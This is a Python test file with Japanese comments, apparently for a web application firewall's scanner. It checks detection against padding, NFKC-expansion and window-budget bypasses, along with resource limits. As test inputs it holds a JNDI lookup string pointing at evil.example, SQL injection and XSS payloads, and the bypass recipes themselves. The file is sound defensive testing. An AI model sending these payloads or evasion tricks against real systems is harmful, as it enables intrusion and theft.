"""
test_scanwindow.py — 走査面のバイパス封じ(パディング/展開/予算独占)と資源境界。
====================================================================================
WAF の「転送する量」と「検査する量」がずれると、そのずれが丸ごと迂回窓になる。ここでは
実際に成立していた 3 系統のバイパスを回帰として固定する:
  · 先頭を無害な文字で埋め、payload を走査上限の外へ押し出す(path/query/ヘッダ値)
  · 正規化中の NFKC 展開(1 文字→最大 18 文字)で後半を押し出す
  · 展開で走査窓の予算を先頭チャンクに独占させ、後続チャンクを丸ごと未走査にする
併せて、走査面の総量・チャレンジ nonce 表・BAN 永続化の間引きといった資源境界も確認する。
"""
import tempfile
import time

from dataplane.engine.lifeform.pipeline import (
    NetShield, _MAX_SCAN, _MAX_SCAN_WINDOWS, _PRE_CUT, _normalize_for_scan,
    _scan_windows)

JNDI = "${jndi:ldap://evil.example/a}"
BOMB = "ﷺ"            # NFKC で 18 文字へ展開する互換文字


def _shield(d, **cfg):
    sh = NetShield(state_dir=d)
    sh.cfg["enabled"] = True
    sh.cfg["persist_bans"] = False
    sh.cfg.update(cfg)
    return sh


def _hit(sh, text):
    return sh._scan_field(text)[0]


def test_windows_cover_input_beyond_one_window():
    # 8192 を超えるフィールドでも全域が走査面に載る(旧: [:_MAX_SCAN] で切っていた)。
    joined = "".join(_scan_windows("A" * _MAX_SCAN + "&x=" + JNDI))
    assert "jndi" in joined


def test_leading_padding_does_not_hide_payload():
    with tempfile.TemporaryDirectory() as d:
        sh = _shield(d)
        for field in ("A" * _MAX_SCAN + "&x=" + JNDI,          # query 相当
                      "/" + "A" * _MAX_SCAN + "/" + JNDI):     # path 相当
            assert _hit(sh, field) == "jndi", field[:24]


def test_nfkc_expansion_does_not_hide_payload():
    # 展開で走査面から押し出す回避。正規化 *後* に切っていた旧実装では素通りした。
    with tempfile.TemporaryDirectory() as d:
        sh = _shield(d)
        assert _hit(sh, "x=" + BOMB * 1250 + "&" + JNDI) == "jndi"


def test_expansion_cannot_monopolise_window_budget():
    # 先頭チャンクを展開文字で埋めても、後続チャンクの payload は必ず走査される。
    with tempfile.TemporaryDirectory() as d:
        sh = _shield(d)
        assert _hit(sh, BOMB * _MAX_SCAN + "&x=" + JNDI) == "jndi"


def test_window_count_is_bounded():
    # どんな入力でも窓数は有界(走査 CPU 面積の上限)。
    for s in (BOMB * _MAX_SCAN, "A" * _PRE_CUT * 2, "%41" * _MAX_SCAN, ""):
        assert len(_scan_windows(s)) <= _MAX_SCAN_WINDOWS


def test_expansion_bomb_stays_affordable():
    # 展開爆弾でイベントループを占有できないこと(全域走査を諦めず、展開自体を抑える)。
    with tempfile.TemporaryDirectory() as d:
        sh = _shield(d)
        sh.inspect("198.51.100.1", path="/warm")          # 初回 import 等を計測から外す
        payload = BOMB * 8000
        t = time.perf_counter()
        for _ in range(5):
            sh.inspect("198.51.100.2", path="/" + payload, query="x=" + payload)
        per = (time.perf_counter() - t) / 5
        assert per < 0.30, per


def test_compat_char_obfuscation_still_folded():
    # 展開を抑えても、ASCII 難読化に使える互換文字(全角/合字)の畳み込みは維持する。
    with tempfile.TemporaryDirectory() as d:
        sh = _shield(d)
        assert _hit(sh, "＜script＞alert(1)") == "xss"
        assert _hit(sh, BOMB * 4000 + "&y=＜script＞") == "xss"


def test_normalize_for_scan_still_single_window():
    # 後方互換: 参照用ヘルパは従来どおり 1 窓へ切り詰める。
    assert len(_normalize_for_scan("A" * _PRE_CUT)) <= _MAX_SCAN


def test_signature_guard_keeps_true_positives():
    # 高コスト署名の前置リテラルゲートが真陽性を落としていないこと。
    with tempfile.TemporaryDirectory() as d:
        sh = _shield(d)
        for s, want in (("' or 1=1 --", "sqli"),
                        ("union select pw from users", "sqli"),
                        ("select name from users where id=1", "sqli"),
                        ("drop table users", "sqli"),
                        ("<script>alert(1)</script>", "xss"),
                        ("<img src=x onerror=alert(1)>", "xss"),
                        ("javascript:alert(1)", "xss"),
                        ("document.cookie", "xss")):
            assert _hit(sh, s) == want, s


def test_signature_guard_cuts_cost_of_decoy_input():
    # ゲートに掛からない大量入力は高価な正規表現へ進まない(CPU 増幅の封じ込め)。
    with tempfile.TemporaryDirectory() as d:
        sh = _shield(d)
        blob = ("select from " * (_MAX_SCAN // 12))[:_MAX_SCAN]
        sh._scan_signatures(blob)                          # ウォームアップ
        t = time.perf_counter()
        for _ in range(5):
            sh._scan_signatures(blob)
        assert (time.perf_counter() - t) / 5 < 0.006


def test_blind_boolean_sqli_detected():
    with tempfile.TemporaryDirectory() as d:
        sh = _shield(d)
        assert _hit(sh, "id=1 AND 1=(SELECT COUNT(*) FROM tabname)") == "sqli_blind"
        assert _hit(sh, "price=1 and 2=3") is None          # 良性は誤検知しない


def test_credential_rate_does_not_ban_other_users():
    # 共有キーの濫用で *別IP の正規利用者* が BAN されない(BAN の第三者転嫁の回帰)。
    with tempfile.TemporaryDirectory() as d:
        sh = _shield(d, cred_rate_enabled=True, cred_rate_limit=20,
                     challenge_score=40, block_score=100)
        for _ in range(40):
            sh.inspect("203.0.113.200", path="/api", cred="shared-key")
        victim = "10.9.9.9"
        for _ in range(5):
            sh.inspect(victim, path="/api", cred="shared-key")
        st = sh._state(victim)
        assert st["ban_until"] <= time.time()
        assert st["score"] == 0.0


def test_ban_persistence_is_debounced_when_table_is_large():
    # BAN 表が育っても、新規BANのたびに全件書き直してロックを長く握らない。
    with tempfile.TemporaryDirectory() as d:
        sh = NetShield(state_dir=d)
        sh.cfg["enabled"] = True
        sh.cfg["persist_bans"] = True
        now = time.time()
        for i in range(600):
            st = sh._state("10.0.%d.%d" % (i // 256, i % 256))
            st["ban_until"] = now + 600
            st["ban_count"] = 1
            st["ban_started"] = now
        sh._save_bans(force=True)
        t = time.perf_counter()
        for _ in range(30):
            sh._save_bans()
        assert (time.perf_counter() - t) / 30 < 0.005
        assert sh._bans_dirty is True            # 未書込は残り、flush_state で確実に出す
        sh.flush_state()
        assert sh._bans_dirty is False
